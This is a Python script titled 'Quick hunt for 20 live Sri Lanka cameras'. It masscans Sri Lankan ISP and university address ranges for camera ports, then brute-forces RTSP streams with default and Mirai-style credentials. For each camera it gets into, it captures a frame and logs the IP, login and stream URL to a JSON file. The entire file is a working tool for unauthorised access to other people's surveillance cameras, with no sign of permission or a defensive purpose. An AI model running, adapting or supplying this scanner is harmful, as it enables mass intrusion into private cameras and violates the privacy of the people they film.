#!/usr/bin/env python3
"""
Quick hunt for 20 live Sri Lanka cameras
"""
import subprocess, os, json, sys, time, shutil
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

CREDS = [
    ('admin', '12345'), ('admin', ''), ('admin', 'admin'), ('admin', '1234'),
    ('admin', '123456'), ('admin', '1111'), ('admin', '888888'), ('admin', '666666'),
    ('root', ''), ('root', 'pass'), ('root', '1234'), ('root', 'root'),
    ('root', 'vizxv'), ('root', 'xc3511'), ('supervisor', 'supervisor'),
    ('ubnt', 'ubnt'), ('admin', 'password'), ('admin', 'admin123'),
]

RTSP_PATHS = [
    '/Streaming/Channels/101',
    '/Streaming/Channels/1', 
    '/h264/ch1/main/av_stream',
    '/cam/realmonitor?channel=1&subtype=0',
    '/stream1',
    '/live/ch00_0',
    '/onvif1',
]

# Expanded Sri Lanka CIDRs for better coverage
SRI_LANKA_CIDRS = [
    '112.134.0.0/15',    # SLT main block
    '220.247.0.0/17',    # SLT broadband
    '124.43.0.0/16',     # Dialog broadband
    '175.157.0.0/16',    # Dialog 4G
    '192.248.0.0/16',    # Lanka Education & Research Network
    '103.0.0.0/16',      # Various LK allocations
    '116.206.0.0/15',    # Hutchison
    '43.224.0.0/14',     # APNIC LK block
    '180.232.0.0/14',    # Dialog/SLT
    '110.12.0.0/15',     # LK mobile
]

WORK_DIR = '/root/vmos-titan-unified/vmos_titan/playground/cctv-tool'
FRAME_DIR = os.path.join(WORK_DIR, 'hunt_frames')
os.makedirs(FRAME_DIR, exist_ok=True)

def masscan_quick(rate=100000):
    """Quick masscan for live cameras"""
    cidr_file = '/tmp/quick_cidr.txt'
    result_file = '/tmp/quick_masscan.txt'
    
    with open(cidr_file, 'w') as f:
        f.write('\n'.join(SRI_LANKA_CIDRS))
    
    cmd = ['masscan', '-iL', cidr_file, '-p', '554,8000,80,443',
           '--rate', str(rate), '--open-only', '-oG', result_file]
    
    print(f'  [QUICK] Scanning {len(SRI_LANKA_CIDRS)} CIDR ranges @ {rate} pps...', flush=True)
    
    try:
        subprocess.run(cmd, capture_output=True, timeout=120, text=True)
    except subprocess.TimeoutExpired:
        print(f'  [QUICK] masscan timeout', flush=True)
    
    targets = []
    if os.path.exists(result_file):
        with open(result_file) as f:
            for line in f:
                if line.startswith('#') or not line.strip():
                    continue
                parts = line.split()
                if len(parts) >= 4 and parts[1] == 'Host:':
                    ip = parts[2]
                    if ':' not in ip:  # Valid IP
                        targets.append(ip)
    
    print(f'  [QUICK] {len(targets)} potential targets found', flush=True)
    return targets[:100]  # Limit to first 100 for speed

def probe_rtsp_fast(ip):
    """Fast RTSP probe - reduced attempts"""
    # Try only top 3 creds and top 3 paths for speed
    top_creds = [('admin', ''), ('admin', '12345'), ('admin', 'admin')]
    top_paths = ['/Streaming/Channels/101', '/Streaming/Channels/1', '/h264/ch1/main/av_stream']
    
    for user, passwd in top_creds:
        for rpath in top_paths:
            auth = f'{user}:{passwd}@' if passwd else f'{user}:@'
            rtsp_url = f'rtsp://{auth}{ip}:554{rpath}'
            frame = os.path.join(FRAME_DIR, f'frame_{ip.replace(".", "_")}.jpg')
            try:
                r = subprocess.run(
                    ['ffmpeg', '-rtsp_transport', 'tcp', '-i', rtsp_url,
                     '-vframes', '1', '-f', 'image2', '-y', frame],
                    capture_output=True, timeout=3, text=True
                )
                if r.returncode == 0 and os.path.exists(frame) and os.path.getsize(frame) > 1000:
                    return {
                        'ip': ip, 'user': user, 'password': passwd,
                        'rtsp_url': rtsp_url, 'rtsp_path': rpath,
                        'frame_file': frame, 'frame_size': os.path.getsize(frame),
                    }
            except (subprocess.TimeoutExpired, Exception):
                pass
            try:
                if os.path.exists(frame) and os.path.getsize(frame) <= 1000:
                    os.remove(frame)
            except:
                pass
    return None

def main():
    print(f'{"="*60}', flush=True)
    print(f'QUICK HUNT: 20 SRI LANKA CAMERAS', flush=True)
    print(f'{"="*60}', flush=True)
    
    # Phase 1: Quick scan
    targets = masscan_quick(rate=100000)
    if not targets:
        print('[!] No targets found. Exiting.', flush=True)
        return
    
    print(f'\n  >>> PROBING FOR 20 LIVE STREAMS <<<\n', flush=True)
    
    # Phase 2: RTSP probe
    streams = []
    done = 0
    t0 = time.time()
    
    with ThreadPoolExecutor(max_workers=50) as pool:
        futures = {pool.submit(probe_rtsp_fast, ip): ip for ip in targets}
        for fut in as_completed(futures):
            done += 1
            try:
                r = fut.result()
                if r:
                    streams.append(r)
                    el = time.time() - t0
                    print(f'  [{done}/{len(targets)}] *** STREAM #{len(streams)}: {r["ip"]} | {r["user"]}:{r["password"]} | {r["frame_size"]:,}B | {el:.0f}s', flush=True)
                    
                    # Stop when we find 20
                    if len(streams) >= 20:
                        break
            except Exception:
                pass
    
    el = time.time() - t0
    print(f'\n  [QUICK] FOUND {len(streams)} STREAMS in {el:.0f}s', flush=True)
    
    if streams:
        print(f'\n=== FOUND {len(streams)} LIVE CAMERAS ===', flush=True)
        for i, s in enumerate(streams, 1):
            print(f'  {i:>2}. {s["ip"]:>16} | {s["user"]}:{s["password"]} | {s["frame_size"]:,}B', flush=True)
            print(f'      RTSP: {s["rtsp_url"]}', flush=True)
        
        # Save results
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_file = os.path.join(WORK_DIR, f'quick_20cams_{ts}.json')
        with open(out_file, 'w') as f:
            json.dump({
                'scan_time': ts,
                'targets_probed': done,
                'streams_found': len(streams),
                'streams': streams
            }, f, indent=2, default=str)
        print(f'\n[+] Results saved: {out_file}', flush=True)
    else:
        print('[!] No streams found.', flush=True)

if __name__ == '__main__':
    main()
